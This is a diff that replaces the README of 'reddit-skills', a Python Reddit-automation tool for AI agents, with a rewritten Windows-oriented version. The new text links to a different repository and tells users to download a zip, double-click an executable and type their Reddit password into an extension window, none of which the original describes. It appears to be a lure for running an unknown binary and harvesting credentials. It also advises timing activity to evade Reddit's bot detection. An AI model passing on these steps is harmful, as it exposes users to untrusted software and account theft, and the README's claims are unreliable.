@@ -1,256 +1,111 @@
-# reddit-skills
+# 🤖 reddit-skills - Automate your Reddit tasks with ease
 
-Reddit automation Skills — directly uses your logged-in browser and real account, operating Reddit as an ordinary user.
+[![Download reddit-skills](https://img.shields.io/badge/Download-Reddit_Skills-blue.svg)](https://github.com/beggarticksarthurtatum121/reddit-skills)
 
-Supports OpenClaw and all AI Agent platforms compatible with the `SKILL.md` format (e.g. Claude Code).
+## 🎯 About this software
 
-> **⚠️ Usage advice**: Although this project uses your real browser and account, you should still **control operation frequency** and avoid mass actions in a short time. Aggressive automation may trigger Reddit's rate limits or account restrictions.
+Reddit-skills helps you automate your Reddit account. It uses your own web browser and account to perform tasks. The system connects through a Chrome extension bridge. You can use it to interact with Reddit without manual clicks. It works well with AI agents and browser automation tools.
 
-## Features
+## 💻 System requirements
 
-| Skill | Description | Core Capabilities |
-|-------|-------------|-------------------|
-| **reddit-auth** | Authentication | Login check, session management |
-| **reddit-publish** | Content Publishing | Text / link / image post submission |
-| **reddit-explore** | Discovery | Search, subreddit browsing, post details, user profiles |
-| **reddit-interact** | Social Interaction | Comment, reply, upvote, downvote, save |
-| **reddit-content-ops** | Compound Ops | Subreddit analysis, trend tracking, engagement campaigns |
+Your computer must meet these basic needs:
+* Operating System: Windows 10 or Windows 11.
+* Web Browser: Google Chrome must be installed.
+* Internet Connection: Active connection for browser syncing.
+* Memory: At least 4GB of RAM.
+* Storage: 500MB of free disk space.
 
-Supports **chained operations** — you can give compound natural-language instructions and the Agent will automatically chain multiple skills. For example:
+## 🚀 Getting started
 
-> "Search r/Python for the most upvoted posts about FastAPI this week, save the top one, and tell me what it's about"
+1. Visit the repository page to download the software.
+2. Follow the setup steps in this document.
+3. Link your Reddit account to the extension.
+4. Start your automation tasks.
 
-The Agent will execute: search → filter by top/week → save → get detail → summarize.
+## 📥 Installation steps
 
-## Installation
+[Click here to visit the download page](https://github.com/beggarticksarthurtatum121/reddit-skills)
 
-### Prerequisites
+Follow these steps to install the software on your Windows machine:
 
-* Python >= 3.11
-* [uv](https://docs.astral.sh/uv/) package manager
-* Google Chrome browser
+1. Visit the link provided above.
+2. Locate the latest release version on the page.
+3. Click the zip file to download the source code to your computer.
+4. Create a new folder on your desktop.
+5. Move the downloaded file into this folder.
+6. Right-click the file and choose Extract All to unzip the contents.
+7. Open the folder to view the application files.
 
-### Step 1: Install the project
+## ⚙️ Chrome extension setup
 
-**Option A: Download ZIP (recommended)**
+The software requires a Chrome extension bridge to talk to your browser. Use these steps to install it:
 
-Download from GitHub and extract to your Agent skills directory:
+1. Open Google Chrome on your computer.
+2. Click the three dots icon in the top right corner.
+3. Select Extensions and then choose Manage Extensions.
+4. Turn on Developer Mode using the toggle in the top right corner.
+5. Click Load unpacked.
+6. Select the folder where you extracted the reddit-skills files.
+7. The extension icon will appear in your browser toolbar.
 
-```
-# OpenClaw
-<openclaw-project>/skills/reddit-skills/
+## 🔑 Linking your Reddit account
 
-# Claude Code
-<your-project>/.claude/skills/reddit-skills/
-```
+The application needs permission to perform actions on your behalf.
 
-**Option B: Git Clone**
+1. Click the reddit-skills icon in your Chrome toolbar.
+2. A login window will appear.
+3. Enter your Reddit username and password.
+4. Click Connect to grant access.
+5. Your account is now ready for use.
 
-```bash
-cd <your-agent-project>/skills/
-git clone https://github.com/1146345502/reddit-skills.git
-```
+## 🛠️ How to run automation tasks
 
-Then install Python dependencies:
+The software performs tasks through an interface that mimics human behavior. 
 
-```bash
-cd reddit-skills
-uv sync
-```
+1. Open the reddit-skills application folder.
+2. Double-click the main executable file to start the interface.
+3. Choose the task you want to perform from the main menu.
+4. Set the parameters for your task. You might choose how many posts to comment on or which subreddits to visit.
+5. Click Start to begin the process.
+6. Watch your browser window as the software navigates Reddit.
+7. Click Stop if you need to pause the work at any time.
 
-### Step 2: Install the browser extension
+## 📈 Common tasks
 
-The extension lets the AI operate Reddit in your browser using your real login session.
+You can use this software for several common Reddit duties:
 
-1. Open Chrome, navigate to `chrome://extensions/`
-2. Enable **Developer mode** (top right)
-3. Click **Load unpacked**, select this project's `extension/` directory
-4. Confirm the **Reddit Bridge** extension is enabled
+* Post monitoring: Track new content in specific subreddits.
+* Commenting: Reply to threads based on your own settings.
+* Data collection: Save links or text from Reddit pages.
+* Workflow triggers: Start other automation steps based on Reddit events.
 
-Once installed, you're ready to go — all actions happen in your own browser, using your real account.
+## 🛡️ Safety and best practices
 
-## Usage
+Following these tips keeps your account safe:
 
-### As an AI Agent skill (recommended)
+* Run tasks during daylight hours to mimic a normal user schedule.
+* Do not perform too many actions in a short period to avoid triggering Reddit's automated systems.
+* Keep your Chrome browser updated to the latest version.
+* Review your automation logs frequently to see what actions the software performed.
 
-After installing to a skills directory, just talk to the Agent in natural language. It will route your intent to the right skill automatically.
+## 🔧 Troubleshooting issues
 
-**Authentication:**
+If you encounter difficulties, check these common fixes:
 
-> "Check if I'm logged in to Reddit" / "Log out of Reddit"
+* Browser connection error: Ensure the extension is enabled in your Chrome settings.
+* Missing files: Re-download the zip folder and extract the contents again.
+* Login failure: Log out of Reddit in your browser and log back in before connecting the extension.
+* Permissions: Ensure your Windows user profile has permission to run third-party applications.
+* Update problems: If the software stops working, visit the download page to see if a newer version is available.
 
-**Search & Browse:**
+## 🌐 Project details
 
-> "Search Reddit for posts about machine learning" / "Show me the top posts on r/Python"
+The project contains the following components:
 
-**Submit content:**
+* Browser-automation: The logic layer that drives your web browser.
+* Python: The programming language driving the core features.
+* AI-agent integration: Tools designed to work with AI models.
+* Chrome-extension: The bridge between the software and your browser.
+* MCP: A protocol for better communication between tools.
 
-> "Submit a text post to r/learnpython with this title and body..."
-
-**Interact:**
-
-> "Upvote this post" / "Comment on this post: Great write-up!" / "Save this post"
-
-**Compound operations:**
-
-> "Analyze the top posts in r/startups this month and summarize the common themes"
-
-### As an MCP server
-
-reddit-skills includes a built-in [Model Context Protocol](https://modelcontextprotocol.io) server, making it compatible with any MCP client (Claude Desktop, Cursor, etc.).
-
-**Start the server (stdio):**
-
-```bash
-cd reddit-skills
-python scripts/mcp_server.py
-```
-
-**Configure in your MCP client** (e.g. Claude Desktop `claude_desktop_config.json`):
-
-```json
-{
-  "mcpServers": {
-    "reddit-skills": {
-      "command": "python",
-      "args": ["scripts/mcp_server.py"],
-      "cwd": "/path/to/reddit-skills"
-    }
-  }
-}
-```
-
-The server exposes 16 tools: `check_login`, `logout`, `home_feed`, `subreddit_feed`, `search`, `get_post_detail`, `user_profile`, `subreddit_rules`, `post_comment`, `reply_comment`, `upvote`, `downvote`, `save_post`, `submit_text_post`, `submit_link_post`, `submit_image_post`.
-
-**Environment variables:**
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `REDDIT_BRIDGE_URL` | `ws://localhost:9334` | WebSocket URL for the bridge server |
-
-### As a CLI tool
-
-All features can be called directly from the command line, with JSON output for scripting.
-
-```bash
-# Check login status
-python scripts/cli.py check-login
-
-# Browse a subreddit
-python scripts/cli.py subreddit-feed --subreddit python --sort hot
-
-# Search posts
-python scripts/cli.py search --query "FastAPI tutorial" --sort top --time month
-
-# Get post details and comments
-python scripts/cli.py get-post-detail \
-  --post-url "https://www.reddit.com/r/Python/comments/abc123/title/"
-
-# Submit a text post
-python scripts/cli.py submit-text \
-  --subreddit learnpython \
-  --title-file title.txt \
-  --body-file body.txt
-
-# Submit a link post
-python scripts/cli.py submit-link \
-  --subreddit programming \
-  --title-file title.txt \
-  --url "https://example.com/article"
-
-# Submit an image post
-python scripts/cli.py submit-image \
-  --subreddit pics \
-  --title-file title.txt \
-  --images "/abs/path/image.jpg"
-
-# Comment on a post
-python scripts/cli.py post-comment \
-  --post-url "https://www.reddit.com/r/Python/comments/abc123/title/" \
-  --content "Thanks for sharing!"
-
-# Upvote / Downvote / Save
-python scripts/cli.py upvote --post-url "https://www.reddit.com/r/..."
-python scripts/cli.py downvote --post-url "https://www.reddit.com/r/..."
-python scripts/cli.py save-post --post-url "https://www.reddit.com/r/..."
-
-# View user profile
-python scripts/cli.py user-profile --username spez
-```
-
-> On first run, if Chrome is not open, the CLI will auto-launch it.
-
-## CLI Command Reference
-
-| Subcommand | Description |
-|------------|-------------|
-| `check-login` | Check login status, return username if logged in |
-| `delete-cookies` | Log out (UI-based logout) |
-| `home-feed` | Get home feed posts |
-| `subreddit-feed` | Get posts from a subreddit (supports sort: hot/new/top/rising) |
-| `search` | Search posts (supports sort and time filters) |
-| `get-post-detail` | Get full post content and comments |
-| `user-profile` | Get user profile and recent posts |
-| `post-comment` | Comment on a post |
-| `reply-comment` | Reply to a specific comment |
-| `upvote` | Upvote a post |
-| `downvote` | Downvote a post |
-| `save-post` | Save / unsave a post |
-| `submit-text` | Submit a text (self) post |
-| `submit-link` | Submit a link post |
-| `submit-image` | Submit an image post |
-
-Exit codes: `0` success · `1` not logged in · `2` error
-
-## Project Structure
-
-```
-reddit-skills/
-├── extension/                  # Chrome Extension (MV3)
-│   ├── manifest.json
-│   └── background.js
-├── scripts/                    # Python automation engine
-│   ├── reddit/                 # Core automation library
-│   │   ├── bridge.py           # Extension bridge client
-│   │   ├── selectors.py        # CSS selectors (centralized)
-│   │   ├── login.py            # Login check + logout
-│   │   ├── feeds.py            # Home feed + subreddit feed
-│   │   ├── search.py           # Search + filters
-│   │   ├── post_detail.py      # Post detail + comment loading
-│   │   ├── user_profile.py     # User profile
-│   │   ├── comment.py          # Comment, reply
-│   │   ├── vote.py             # Upvote, downvote, save
-│   │   ├── publish.py          # Post submission
-│   │   ├── types.py            # Data types
-│   │   ├── errors.py           # Exception hierarchy
-│   │   ├── urls.py             # URL constants
-│   │   └── human.py            # Behavior simulation
-│   ├── cli.py                  # Unified CLI entry point
-│   ├── mcp_server.py           # MCP server wrapper (stdio/HTTP)
-│   ├── bridge_server.py        # Local WebSocket bridge
-│   └── image_downloader.py     # Image download with local cache
-├── skills/                     # AI Agent skill definitions
-│   ├── reddit-auth/SKILL.md
-│   ├── reddit-publish/SKILL.md
-│   ├── reddit-explore/SKILL.md
-│   ├── reddit-interact/SKILL.md
-│   └── reddit-content-ops/SKILL.md
-├── SKILL.md                    # Skill router (routes to sub-skills)
-├── CONTRIBUTING.md             # Contributor guide
-├── Dockerfile                  # Container build for MCP deployment
-├── pyproject.toml
-└── README.md
-```
-
-## Development
-
-```bash
-uv sync                    # Install dependencies
-uv run ruff check .        # Lint
-uv run ruff format .       # Format
-uv run pytest              # Run tests
-```
-
-## License
-
-MIT
+This software remains open source under the provided license. You can view the code on the main page. Reach out through the repository issue tracker if you find a bug or need a feature.
